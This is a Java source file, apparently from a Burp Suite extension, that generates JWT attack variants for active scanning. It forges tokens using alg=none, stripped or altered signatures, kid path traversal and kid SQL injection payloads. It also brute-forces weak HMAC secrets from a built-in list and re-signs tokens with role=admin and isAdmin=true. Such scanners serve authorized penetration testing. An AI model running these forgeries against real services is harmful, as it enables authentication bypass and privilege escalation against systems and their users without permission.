package core.scan.jwt;

import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.requests.HttpRequest;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * JWT 主动扫描 payload 生成器。
 * 覆盖签名校验绕过、none 算法、kid 注入以及 HMAC 弱密钥后的声明校验。
 */
public class JwtPayloadService {

    private static final Pattern JWT_PATTERN = Pattern.compile(
            "(?<![A-Za-z0-9_-])([A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]*)(?![A-Za-z0-9_-])");
    private static final Pattern ALG_PATTERN = Pattern.compile(
            "\\\"alg\\\"\\s*:\\s*\\\"([^\\\"]+)\\\"", Pattern.CASE_INSENSITIVE);
    private static final List<String> COMMON_SECRETS = List.of(
            "secret", "password", "123456", "qwerty", "changeme", "jwt", "jwtsecret",
            "jwt_secret", "secretkey", "secret_key", "your-256-bit-secret", "mysecret",
            "my-secret", "authkit", "admin", "test", "development", "production",
            "supersecret", "keyboard cat", "default", "token", "HS256", "api-secret"
    );

    public List<JwtScanVariant> generateVariants(HttpRequest baseRequest) {
        if (baseRequest == null) return List.of();
        List<TokenOccurrence> occurrences = findOccurrences(baseRequest);
        List<JwtScanVariant> variants = new ArrayList<>();
        for (TokenOccurrence occurrence : occurrences) {
            addTokenVariants(baseRequest, occurrence, variants);
        }
        return variants;
    }

    public boolean containsJwt(HttpRequest request) {
        return request != null && !findOccurrences(request).isEmpty();
    }

    private void addTokenVariants(HttpRequest base, TokenOccurrence occurrence,
                                  List<JwtScanVariant> variants) {
        String token = occurrence.token();
        String[] parts = token.split("\\.", -1);
        String headerJson = decode(parts[0]);
        String payloadJson = decode(parts[1]);
        if (!looksLikeObject(headerJson) || !looksLikeObject(payloadJson)) return;

        variants.add(new JwtScanVariant("baseline", occurrence.location(), "Original JWT request",
                base, true));

        String unsignedPayload = putJsonValue(payloadJson, "authkit_probe", "true");
        variants.add(variant(base, occurrence, "unsigned-payload", "Payload changed without re-signing",
                encode(headerJson) + "." + encode(unsignedPayload) + "." + parts[2]));

        String invalidSignature = parts[2].isEmpty() ? "AA" : flipFirst(parts[2]);
        variants.add(variant(base, occurrence, "invalid-signature", "Signature bytes changed",
                parts[0] + "." + parts[1] + "." + invalidSignature));
        variants.add(variant(base, occurrence, "empty-signature", "Signature stripped",
                parts[0] + "." + parts[1] + "."));

        for (String none : List.of("none", "None", "NONE", "nOnE")) {
            String noneHeader = putJsonValue(headerJson, "alg", quote(none));
            variants.add(variant(base, occurrence, "alg-none", "alg=" + none,
                    encode(noneHeader) + "." + parts[1] + "."));
        }

        String algorithm = extractAlgorithm(headerJson);
        if (algorithm.startsWith("HS")) {
            addKidVariants(base, occurrence, parts[1], headerJson, algorithm, variants);
            String secret = crackHmacSecret(token, algorithm);
            if (secret != null) {
                addWeakSecretVariants(base, occurrence, headerJson, payloadJson, algorithm, secret, variants);
            }
        }
    }

    private void addKidVariants(HttpRequest base, TokenOccurrence occurrence, String payloadPart,
                                String headerJson, String algorithm, List<JwtScanVariant> variants) {
        String pathHeader = putJsonValue(headerJson, "kid", quote("../../../../dev/null"));
        variants.add(variant(base, occurrence, "kid-path-traversal", "kid=../../../../dev/null",
                sign(pathHeader, payloadPart, algorithm, "")));

        String sqlHeader = putJsonValue(headerJson, "kid", quote("' UNION SELECT 'authkit'--"));
        variants.add(variant(base, occurrence, "kid-sql-injection", "UNION SELECT controlled key",
                sign(sqlHeader, payloadPart, algorithm, "authkit")));
    }

    private void addWeakSecretVariants(HttpRequest base, TokenOccurrence occurrence, String headerJson,
                                       String payloadJson, String algorithm, String secret,
                                       List<JwtScanVariant> variants) {
        String probe = putJsonValue(payloadJson, "authkit_probe", "true");
        variants.add(variant(base, occurrence, "weak-hmac-secret",
                "JWT signed with common secret: " + secret,
                sign(headerJson, encode(probe), algorithm, secret)));

        String admin = putJsonValue(putJsonValue(payloadJson, "role", quote("admin")),
                "isAdmin", "true");
        variants.add(variant(base, occurrence, "claim-privilege-escalation",
                "role=admin, isAdmin=true; common secret=" + secret,
                sign(headerJson, encode(admin), algorithm, secret)));

        long now = System.currentTimeMillis() / 1000L;
        String expired = putJsonValue(payloadJson, "exp", Long.toString(now - 3600));
        variants.add(variant(base, occurrence, "expired-token",
                "Expired token re-signed with discovered secret",
                sign(headerJson, encode(expired), algorithm, secret)));

        String future = putJsonValue(payloadJson, "nbf", Long.toString(now + 86400));
        variants.add(variant(base, occurrence, "future-nbf",
                "Future nbf token re-signed with discovered secret",
                sign(headerJson, encode(future), algorithm, secret)));
    }

    private JwtScanVariant variant(HttpRequest base, TokenOccurrence occurrence,
                                   String technique, String comment, String replacement) {
        HttpRequest request = occurrence.replace(base, replacement);
        return new JwtScanVariant(technique, occurrence.location(), comment, request, false);
    }

    private List<TokenOccurrence> findOccurrences(HttpRequest request) {
        List<TokenOccurrence> occurrences = new ArrayList<>();
        String path = safe(request.path());
        findTokens(path, token -> occurrences.add(new TokenOccurrence(token, "URL", null, path)));

        try {
            for (HttpHeader header : request.headers()) {
                String value = safe(header.value());
                findTokens(value, token -> occurrences.add(new TokenOccurrence(
                        token, "Header: " + header.name(), header.name(), value)));
            }
        } catch (Exception ignored) {
            // 保留已找到的 JWT
        }

        String body = safe(request.bodyToString());
        findTokens(body, token -> occurrences.add(new TokenOccurrence(token, "Body", null, body)));

        Set<String> unique = new LinkedHashSet<>();
        List<TokenOccurrence> deduplicated = new ArrayList<>();
        for (TokenOccurrence occurrence : occurrences) {
            String key = occurrence.location() + "\u0000" + occurrence.token();
            if (unique.add(key)) deduplicated.add(occurrence);
        }
        return deduplicated;
    }

    private void findTokens(String value, java.util.function.Consumer<String> consumer) {
        Matcher matcher = JWT_PATTERN.matcher(value);
        while (matcher.find()) {
            String token = matcher.group(1);
            String[] parts = token.split("\\.", -1);
            if (parts.length == 3 && looksLikeObject(decode(parts[0])) && looksLikeObject(decode(parts[1]))) {
                consumer.accept(token);
            }
        }
    }

    private String crackHmacSecret(String token, String algorithm) {
        String[] parts = token.split("\\.", -1);
        if (parts.length != 3 || parts[2].isEmpty()) return null;
        byte[] expected;
        try {
            expected = Base64.getUrlDecoder().decode(pad(parts[2]));
        } catch (IllegalArgumentException ignored) {
            return null;
        }
        String signingInput = parts[0] + "." + parts[1];
        for (String secret : COMMON_SECRETS) {
            byte[] actual = hmac(signingInput, algorithm, secret);
            if (actual != null && MessageDigest.isEqual(expected, actual)) return secret;
        }
        return null;
    }

    private String sign(String headerJson, String payloadPart, String algorithm, String secret) {
        String headerPart = encode(headerJson);
        String signingInput = headerPart + "." + payloadPart;
        byte[] signature = hmac(signingInput, algorithm, secret);
        if (signature == null) signature = hmac(signingInput, "HS256", secret);
        return signingInput + "." + Base64.getUrlEncoder().withoutPadding().encodeToString(signature);
    }

    private byte[] hmac(String input, String algorithm, String secret) {
        try {
            String jca = switch (algorithm.toUpperCase(Locale.ROOT)) {
                case "HS384" -> "HmacSHA384";
                case "HS512" -> "HmacSHA512";
                default -> "HmacSHA256";
            };
            if (secret.isEmpty()) {
                return hmacWithEmptyKey(input, jca);
            }
            Mac mac = Mac.getInstance(jca);
            mac.init(new SecretKeySpec(secret.getBytes(StandardCharsets.UTF_8), jca));
            return mac.doFinal(input.getBytes(StandardCharsets.US_ASCII));
        } catch (Exception ignored) {
            return null;
        }
    }

    /** SecretKeySpec 不接受空字节数组，按 RFC 2104 直接计算空密钥 HMAC。 */
    private byte[] hmacWithEmptyKey(String input, String jcaAlgorithm) throws Exception {
        String digestAlgorithm = switch (jcaAlgorithm) {
            case "HmacSHA384" -> "SHA-384";
            case "HmacSHA512" -> "SHA-512";
            default -> "SHA-256";
        };
        int blockSize = jcaAlgorithm.equals("HmacSHA384") || jcaAlgorithm.equals("HmacSHA512") ? 128 : 64;
        byte[] innerPad = new byte[blockSize];
        byte[] outerPad = new byte[blockSize];
        java.util.Arrays.fill(innerPad, (byte) 0x36);
        java.util.Arrays.fill(outerPad, (byte) 0x5c);
        MessageDigest digest = MessageDigest.getInstance(digestAlgorithm);
        digest.update(innerPad);
        byte[] inner = digest.digest(input.getBytes(StandardCharsets.US_ASCII));
        digest.reset();
        digest.update(outerPad);
        return digest.digest(inner);
    }

    private String putJsonValue(String json, String key, String value) {
        Pattern field = Pattern.compile("(\\\"" + Pattern.quote(key)
                + "\\\"\\s*:\\s*)(\\\"(?:\\\\.|[^\\\"])*\\\"|true|false|null|-?\\d+(?:\\.\\d+)?)",
                Pattern.CASE_INSENSITIVE);
        Matcher matcher = field.matcher(json);
        if (matcher.find()) return matcher.replaceFirst(Matcher.quoteReplacement(matcher.group(1) + value));
        int end = json.lastIndexOf('}');
        if (end < 0) return json;
        String prefix = json.substring(0, end).trim();
        String separator = prefix.endsWith("{") ? "" : ",";
        return json.substring(0, end) + separator + quote(key) + ":" + value + json.substring(end);
    }

    private String extractAlgorithm(String headerJson) {
        Matcher matcher = ALG_PATTERN.matcher(headerJson);
        return matcher.find() ? matcher.group(1).toUpperCase(Locale.ROOT) : "";
    }

    private String encode(String value) {
        return Base64.getUrlEncoder().withoutPadding()
                .encodeToString(value.getBytes(StandardCharsets.UTF_8));
    }

    private String decode(String value) {
        try {
            return new String(Base64.getUrlDecoder().decode(pad(value)), StandardCharsets.UTF_8);
        } catch (IllegalArgumentException ignored) {
            return "";
        }
    }

    private String pad(String value) {
        int padding = (4 - value.length() % 4) % 4;
        return value + "=".repeat(padding);
    }

    private boolean looksLikeObject(String value) {
        String trimmed = safe(value).trim();
        return trimmed.startsWith("{") && trimmed.endsWith("}");
    }

    private String flipFirst(String signature) {
        char first = signature.charAt(0);
        return (first == 'A' ? 'B' : 'A') + signature.substring(1);
    }

    private String quote(String value) {
        return "\"" + value.replace("\\", "\\\\").replace("\"", "\\\"") + "\"";
    }

    private String safe(String value) {
        return value != null ? value : "";
    }

    private record TokenOccurrence(String token, String location, String headerName,
                                   String containerValue) {
        HttpRequest replace(HttpRequest request, String replacement) {
            if (location.startsWith("Header:")) {
                return request.withUpdatedHeader(headerName, containerValue.replace(token, replacement));
            }
            if (location.equals("URL")) {
                return request.withPath(containerValue.replace(token, replacement));
            }
            return request.withBody(containerValue.replace(token, replacement));
        }
    }
}
